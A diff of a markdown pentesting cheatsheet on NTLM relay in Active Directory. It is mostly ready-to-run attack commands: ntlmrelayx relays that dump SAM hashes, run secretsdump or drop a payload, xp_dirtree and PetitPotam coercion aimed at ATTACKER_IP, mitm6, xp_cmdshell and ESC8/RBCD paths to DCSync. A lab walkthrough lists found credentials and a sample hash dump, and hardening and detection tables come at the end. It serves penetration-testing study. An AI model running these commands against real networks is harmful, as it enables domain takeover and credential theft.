@@ -5,54 +5,150 @@ category: Methodology
 subcategory: Active Directory Attack
 order: 3
 tags: ["active-directory", "ntlm-relay", "petitpotam", "mitm6", "pentesting"]
-updated: 2026-04-11
+updated: 2026-04-15
 ---
 
-# Part 3: Exploiting Automated Relays
+# NTLM Relay Attack — Complete Cheatsheet
 
 NTLM relay is one of the most powerful attack classes in Active Directory. The concept is simple: intercept an NTLM authentication attempt and forward it to a different service, authenticating as the victim. When combined with **coercion techniques** that force machines (including Domain Controllers) to authenticate to you, this often leads to immediate domain compromise.
 
 ---
 
-## How NTLM Relay Works
+## Part 1: Understanding NTLM Authentication
+
+### How NTLM Works Under the Hood
+
+NTLM is a challenge-response authentication protocol used in Windows environments.
+When a client wants to access a resource (like an SMB share), this happens:
 
 ```
-Victim Machine                    Attacker                    Target Server
-      |                              |                              |
-      |  ← coerce authentication →   |                              |
-      |  ---NTLM Auth (negotiate)--> |                              |
-      |                              | ---NTLM Auth (negotiate)---> |
-      |                              | <--NTLM Challenge----------- |
-      |  <--NTLM Challenge---------- |                              |
-      |  ---NTLM Response----------> |                              |
-      |                              | ---NTLM Response-----------> |
-      |                              |       ✅ Authenticated!       |
+Client                          Server
+  |                               |
+  |--- NEGOTIATE message -------->|   "I want to authenticate"
+  |                               |
+  |<-- CHALLENGE message ---------|   "Prove it. Here's a random number"
+  |                               |
+  |--- AUTHENTICATE message ----->|   "Here's my response (hash of password + your challenge)"
+  |                               |
+  |<-- ACCESS GRANTED ------------|   "Checks out. Welcome."
 ```
 
-The attacker never cracks the password — they simply proxy the authentication exchange.
+The client never sends the actual password. It sends a **response** computed from the password hash and the server's challenge.
+
+### How NTLM Relay Intercepts This
+
+The attacker sits in the middle and **forwards** the authentication to a different target.
+The attacker never cracks or knows the password — they just pass messages along in real-time.
+
+```
+Victim (MS01)            Attacker (Kali)              Target (DC01)
+     |                        |                            |
+     |--- NEGOTIATE --------->|                            |
+     |                        |--- NEGOTIATE ------------->|
+     |                        |                            |
+     |                        |<-- CHALLENGE (C1) ---------|  DC01 sends challenge
+     |<-- CHALLENGE (C1) -----|                            |
+     |                        |                            |
+     |--- AUTH(hash+C1) ----->|                            |  Victim solves DC01's challenge
+     |                        |--- AUTH(hash+C1) --------->|  Attacker forwards it
+     |                        |                            |
+     |                        |<-- ACCESS GRANTED ---------|  DC01 accepts it
+     |                        |                            |
+     |                        |   Attacker now has an      |
+     |                        |   authenticated session    |
+     |                        |   on DC01 as Victim        |
+```
+
+**Key Insight:** The victim thinks it's authenticating to the attacker's server. DC01 thinks the attacker IS the victim. The attacker just relays messages between them.
+
+### Why SMB Signing Breaks Relay
+
+SMB signing = every message after authentication is cryptographically signed using a key derived from the password.
+
+```
+Signing REQUIRED:
+  - After relay, DC01 says: "Sign this message with the session key"
+  - Attacker doesn't know the password → can't compute the key → session dies
+  - RELAY FAILS ❌
+
+Signing NOT REQUIRED:
+  - After relay, DC01 doesn't ask for signatures
+  - Attacker can send unsigned commands freely
+  - RELAY WORKS ✅
+```
+
+### What the Relayed Account Determines
+
+```
+Machine Account (MS01$):
+  └─ Limited. Can read some shares, enumerate AD.
+     Possibly add a computer for RBCD attack.
+
+Service Account (svc_mssql):
+  └─ Depends on privileges. If local admin on target → SAM dump, code exec.
+     If Domain Admin or high-privilege → full compromise.
+
+Regular User:
+  └─ Can access their own resources on target.
+     Useful for share enumeration, data theft.
+```
 
 ---
 
-## Step 1: Identify Relay Targets
+## Part 2: Clue Recognition — When to Think About Relay
 
-Not every machine can be relayed to. You need to check for **signing requirements**:
+### NTLM Relay Clue Checklist
+
+```
+✅ 1. SMB signing NOT required on target   → nmap smb2-security-mode / nxc signing:False
+✅ 2. Way to trigger NTLM auth             → MSSQL xp_dirtree, PetitPotam, PrinterBug, etc.
+✅ 3. Creds to reach the trigger            → found in config files, shares, etc.
+✅ 4. Valuable relay target                 → DC, server with sensitive data
+✅ 5. No other obvious path forward         → null sessions locked, guest disabled, RID brute fails
+```
+
+### How to Check Signing Status
+
+```bash
+# Nmap
+nmap --script smb2-security-mode -p 445 TARGET
+# Look for: "Message signing enabled but not required"
+
+# NetExec
+nxc smb TARGET -u '' -p ''
+# Look for: (signing:False)
+```
+
+### Clue Signals in CTF/Engagement
+
+1. **SMB signing disabled on all machines** — Nmap: `enabled but not required`, nxc: `signing:False`
+2. **Unusual services on a DC** — MSSQL on a DC is unusual, signals intended attack vector
+3. **Credentials found for a service** — config files on shares with DB creds = trigger for coercion
+4. **Multiple machines in the domain** — relay needs a source and a target
+5. **Limited access otherwise** — null sessions locked, guest disabled, no other path forward
+
+---
+
+## Part 3: Identify Relay Targets
+
+Not every machine can be relayed to. You need to check for signing requirements:
 
 ```bash
 # Find SMB targets without signing (workstations are often vulnerable)
-crackmapexec smb 10.10.10.0/24 --gen-relay-list smb-targets.txt
+nxc smb 10.10.10.0/24 --gen-relay-list smb-targets.txt
 
 # Check LDAP signing
-crackmapexec ldap dc01 -u user -p pass -M ldap-checker
+nxc ldap dc01 -u user -p pass -M ldap-checker
 
 # Check for ADCS HTTP enrollment (ESC8 target)
-crackmapexec http 10.10.10.0/24 -M adcs
+nxc http 10.10.10.0/24 -M adcs
 certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable
 ```
 
 ### Signing Requirements Matrix
 
 | Protocol | Default Signing | Relay Possible? |
-|---|---|---|
+|----------|----------------|-----------------|
 | SMB (DCs) | Required | ❌ No |
 | SMB (workstations/servers) | Not required | ✅ Yes |
 | LDAP | Negotiated (often not enforced) | ✅ Usually |
@@ -60,11 +156,34 @@ certipy find -u user@domain.local -p pass -dc-ip DC_IP -vulnerable
 | HTTP (ADCS) | None | ✅ Yes |
 | MSSQL | None | ✅ Yes |
 
+### Relay Across Protocols
+
+NTLM auth can be relayed across protocols:
+
+| Source → Target | Use Case |
+|-----------------|----------|
+| SMB → SMB | Classic relay, command exec, SAM dump |
+| SMB → LDAP | Add computer, modify ACLs, RBCD attack |
+| SMB → HTTP/ADCS | Request certificates (ESC8) |
+| HTTP → LDAP | WebDAV to LDAP for delegation attacks |
+| MSSQL → SMB | Force SQL service auth, relay to SMB target |
+
 ---
 
-## Step 2: Coerce Authentication
+## Part 4: Coerce Authentication
 
 Force a machine to authenticate to your attacker host. Multiple protocols support this:
+
+### MSSQL — xp_dirtree
+
+```sql
+-- From an MSSQL session, force SQL service to connect to attacker
+EXEC xp_dirtree '\\ATTACKER_IP\share';
+
+-- Alternatives
+EXEC master..xp_subdirs '\\ATTACKER_IP\share';
+EXEC master..xp_fileexist '\\ATTACKER_IP\share\file';
+```
 
 ### PetitPotam (MS-EFSRPC)
 
@@ -108,18 +227,42 @@ Coercer.py coerce -t TARGET_IP -l ATTACKER_IP -u user -p pass -d domain.local
 
 ---
 
-## Relay Scenario 1: NTLM Relay to LDAP → RBCD
+## Part 5: Relay Scenarios
 
-**Severity:** 🔴 Critical
+### Scenario 1: NTLM Relay to SMB → Code Execution
+
+**Severity: 🟠 High**
+
+Relay to a machine without SMB signing to execute code.
+
+```bash
+# Terminal 1: Start relay with command execution
+ntlmrelayx.py -tf smb-targets.txt -smb2support -c "whoami > C:\relay-proof.txt"
+
+# Or drop a payload
+ntlmrelayx.py -tf smb-targets.txt -smb2support -e payload.exe
+
+# Or dump SAM database
+ntlmrelayx.py -tf smb-targets.txt -smb2support --dump-sam
+
+# Terminal 2: Coerce or wait for authentication
+# LLMNR/NBT-NS poisoning with Responder (in relay mode):
+Responder.py -I eth0 -rdw  # -w for WPAD, -d for DHCP, relay mode disables SMB/HTTP servers
+
+# Or active coercion
+PetitPotam.py ATTACKER_IP TARGET_IP
+```
+
+### Scenario 2: NTLM Relay to LDAP → RBCD
+
+**Severity: 🔴 Critical**
 
 The most common path to Domain Admin from a network position. Relay a machine account's authentication to LDAP to configure RBCD, then impersonate an admin.
 
-### Prerequisites
+**Prerequisites:**
 - Coerce a machine account to authenticate to you
 - LDAP signing NOT enforced on the DC
 - MachineAccountQuota > 0 (or you already control a computer account)
-
-### Execution
 
 ```bash
 # Terminal 1: Start relay — automatically configures RBCD
@@ -142,37 +285,9 @@ export KRB5CCNAME=administrator.ccache
 secretsdump.py -k -no-pass domain.local/administrator@DC01.domain.local
 ```
 
----
+### Scenario 3: NTLM Relay to ADCS HTTP (ESC8)
 
-## Relay Scenario 2: NTLM Relay to SMB → Code Execution
-
-**Severity:** 🟠 High
-
-Relay to a machine without SMB signing to execute code.
-
-```bash
-# Terminal 1: Start relay with command execution
-ntlmrelayx.py -tf smb-targets.txt -smb2support -c "whoami > C:\relay-proof.txt"
-
-# Or drop a payload
-ntlmrelayx.py -tf smb-targets.txt -smb2support -e payload.exe
-
-# Or dump SAM database
-ntlmrelayx.py -tf smb-targets.txt -smb2support --dump-sam
-
-# Terminal 2: Coerce or wait for authentication
-# LLMNR/NBT-NS poisoning with Responder (in relay mode):
-Responder.py -I eth0 -rdw  # -w for WPAD, -d for DHCP, relay mode disables SMB/HTTP servers
-
-# Or active coercion
-PetitPotam.py ATTACKER_IP TARGET_IP
-```
-
----
-
-## Relay Scenario 3: NTLM Relay to ADCS HTTP (ESC8)
-
-**Severity:** 🔴 Critical
+**Severity: 🔴 Critical**
 
 Relay to AD Certificate Services' HTTP enrollment endpoint to obtain a certificate as the relayed account. If you relay a DC machine account, you get a cert that allows DCSync.
 
@@ -192,13 +307,11 @@ certipy auth -pfx dc01.pfx -dc-ip DC_IP
 secretsdump.py -k -no-pass domain.local/DC01\$@dc01.domain.local
 ```
 
----
+### Scenario 4: mitm6 — IPv6 DNS Takeover
 
-## Relay Scenario 4: mitm6 — IPv6 DNS Takeover
+**Severity: 🟠 High**
 
-**Severity:** 🟠 High
-
-Most Windows networks have IPv6 enabled but don't use it. `mitm6` exploits this by acting as a rogue DHCPv6 server and DNS server, intercepting requests and coercing NTLM authentication via WPAD or DNS.
+Most Windows networks have IPv6 enabled but don't use it. mitm6 exploits this by acting as a rogue DHCPv6 server and DNS server, intercepting requests and coercing NTLM authentication via WPAD or DNS.
 
 ```bash
 # Terminal 1: Start mitm6
@@ -220,9 +333,7 @@ ntlmrelayx.py -6 -t ldaps://dc01.domain.local \
 
 > 💡 **Tip:** mitm6 is particularly effective in environments with WPAD enabled. It catches machine accounts as they boot or refresh their network configuration.
 
----
-
-## Relay Scenario 5: Relay to MSSQL
+### Scenario 5: Relay to MSSQL
 
 ```bash
 # Relay to SQL Server — execute queries as the relayed user
@@ -233,15 +344,13 @@ ntlmrelayx.py -t mssql://sql01.domain.local \
   -q "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami';"
 ```
 
----
+### Scenario 6: WebDAV + Coercion Combo
 
-## WebDAV + Coercion Combo
-
-When the WebClient service is running on a workstation, you can coerce authentication over HTTP instead of SMB — which **avoids SMB signing** entirely.
+When the WebClient service is running on a workstation, you can coerce authentication over HTTP instead of SMB — which avoids SMB signing entirely.
 
 ```bash
 # Check if WebClient is running
-crackmapexec smb targets -u user -p pass -M webdav
+nxc smb targets -u user -p pass -M webdav
 
 # Start WebDAV listener + relay
 ntlmrelayx.py -t ldap://dc01.domain.local --delegate-access
@@ -253,21 +362,83 @@ PetitPotam.py ATTACKER@80/path TARGET_IP
 
 ---
 
-## Defense & Detection
+## Part 6: Attack Setup Quick Reference
+
+### Step 1 — Prepare ntlmrelayx (Terminal 1)
+
+```bash
+# Basic relay to SMB
+ntlmrelayx.py -t smb://TARGET_IP -smb2support
+
+# Relay and dump SAM hashes
+ntlmrelayx.py -t smb://TARGET_IP -smb2support --dump-laps
+
+# Relay and execute a command
+ntlmrelayx.py -t smb://TARGET_IP -smb2support -c 'whoami'
+
+# Relay and run secretsdump
+ntlmrelayx.py -t smb://TARGET_IP -smb2support --secretsdump
+
+# Relay to LDAP (for delegations, ACL abuse)
+ntlmrelayx.py -t ldap://DC_IP --delegate-access
+
+# Relay to multiple targets from a file
+ntlmrelayx.py -tf targets.txt -smb2support
+```
+
+### Step 2 — Trigger Authentication (Terminal 2)
+
+```bash
+# Via MSSQL
+impacket-mssqlclient 'user:pass@VICTIM_IP'
+SQL> EXEC xp_dirtree '\\ATTACKER_IP\share';
+
+# Via PetitPotam
+python3 PetitPotam.py ATTACKER_IP VICTIM_IP
+
+# Via Responder (passive — wait for traffic)
+responder -I eth0 -dwv
+```
+
+### Step 3 — Profit
+
+ntlmrelayx will show you the result:
+```
+[*] SMBD: Received connection from 10.13.38.45
+[*] Authenticating against smb://10.13.38.44 as REFLECTION/SVC_MSSQL SUCCEED
+[*] Dumping SAM hashes...
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+```
+
+---
+
+## Part 7: Common Pitfalls
+
+| Problem | Cause | Fix |
+|---------|-------|-----|
+| Relay fails silently | Signing required on target | Check signing, pick different target |
+| "Account not found" | Relaying to wrong domain | Ensure victim and target are same domain |
+| Access denied after relay | Relayed account has no privs on target | Try different target or coerce higher-priv account |
+| Connection refused on 445 | Your own SMB is running | `sudo systemctl stop smbd` before running ntlmrelayx |
+| Auth received but not relayed | Relaying back to source | Can't relay creds back to the machine they came from |
+
+---
+
+## Part 8: Defense & Detection
 
 ### Hardening
 
 | Control | What It Prevents |
-|---|---|
-| **Enable SMB signing** on all machines | SMB relay |
-| **Enable LDAP signing** | LDAP relay |
-| **Enable LDAP channel binding** | LDAPS relay |
-| **Enable EPA** on ADCS web enrollment | ESC8 relay |
-| **Disable NTLM** entirely (enforce Kerberos) | All NTLM relay |
-| **Disable IPv6** via GPO if unused | mitm6 attacks |
-| **Disable Print Spooler** on servers | PrinterBug coercion |
-| **Set MachineAccountQuota to 0** | Blocks RBCD computer creation |
-| **Disable WebClient** on servers | WebDAV relay |
+|---------|-----------------|
+| Enable SMB signing on all machines | SMB relay |
+| Enable LDAP signing | LDAP relay |
+| Enable LDAP channel binding | LDAPS relay |
+| Enable EPA on ADCS web enrollment | ESC8 relay |
+| Disable NTLM entirely (enforce Kerberos) | All NTLM relay |
+| Disable IPv6 via GPO if unused | mitm6 attacks |
+| Disable Print Spooler on servers | PrinterBug coercion |
+| Set MachineAccountQuota to 0 | Blocks RBCD computer creation |
+| Disable WebClient on servers | WebDAV relay |
 
 ### GPO Settings
 
@@ -288,10 +459,10 @@ Computer Configuration → Administrative Templates → Network → IPv6 →
 ### Detection (Event IDs)
 
 | Event ID | What It Catches |
-|---|---|
-| **4624** | Logon events — watch for network logons from unusual IPs |
-| **4648** | Explicit credential logon — relay indicators |
-| **8004** (NTLM audit) | NTLM authentication events — identify relay sources |
+|----------|----------------|
+| 4624 | Logon events — watch for network logons from unusual IPs |
+| 4648 | Explicit credential logon — relay indicators |
+| 8004 (NTLM audit) | NTLM authentication events — identify relay sources |
 
 ### Network Monitoring
 
@@ -299,6 +470,52 @@ Computer Configuration → Administrative Templates → Network → IPv6 →
 - Alert on NTLM authentication to LDAP from non-DC IPs
 - Monitor for rogue DHCPv6 servers (mitm6 indicator)
 - Alert on certificate enrollment from machine accounts that shouldn't be enrolling
+
+---
+
+## Part 9: Tools Reference
+
+| Tool | Purpose | Install |
+|------|---------|---------|
+| ntlmrelayx.py | Relay NTLM auth to targets | `apt install impacket-scripts` |
+| Responder | Poison LLMNR/NBT-NS, capture hashes | `apt install responder` |
+| PetitPotam | Coerce auth via MS-EFSRPC | `git clone github.com/topotam/PetitPotam` |
+| PrinterBug | Coerce auth via Print Spooler | Part of krbrelayx toolkit |
+| DFSCoerce | Coerce auth via MS-DFSNM | `git clone github.com/Wh04m1001/DFSCoerce` |
+| ShadowCoerce | Coerce auth via MS-FSRVP | `git clone github.com/ShutdownRepo/ShadowCoerce` |
+| Coercer | Multi-protocol coercion scanner | `pip install coercer` |
+| mitm6 | IPv6 DNS takeover | `pip install mitm6` |
+| impacket-mssqlclient | Interactive MSSQL shell | `apt install impacket-scripts` |
+| NetExec (nxc) | Swiss army knife for AD | `apt install netexec` |
+| certipy | ADCS enumeration & exploitation | `pip install certipy-ad` |
+
+---
+
+## Part 10: Lab Reference — Reflection (reflection.vl)
+
+```
+Environment:
+  DC01  10.13.38.44  → Domain Controller, MSSQL, SMB signing:False
+  MS01  10.13.38.45  → Member Server, MSSQL (web_staging:Washroom510), SMB signing:False
+  WS01  10.13.38.46  → Workstation, SMB signing:False
+
+Attack Path:
+  1. Scanned all three hosts — identified DC profile + MSSQL on DC01 (unusual)
+  2. SMB signing disabled on all machines (relay viable)
+  3. Guest account enabled on MS01 — enumerated "staging" share
+  4. Found staging_db.conf → web_staging:Washroom510
+  5. Logged into MSSQL on MS01 (local auth)
+  6. Trigger xp_dirtree → forces MS01 MSSQL service to auth to Kali
+  7. ntlmrelayx relays that auth to DC01 (signing not required)
+  8. Authenticated session on DC01 as MSSQL service account
+
+Clue Recognition:
+  ✅ SMB signing NOT required on all targets
+  ✅ MSSQL on DC (unusual = intended vector)
+  ✅ Creds found on SMB share → MSSQL access → coercion trigger
+  ✅ Multiple machines = source + target for relay
+  ✅ No other path forward (null sessions locked, guest disabled on DC01/WS01)
+```
 
 &nbsp;
 
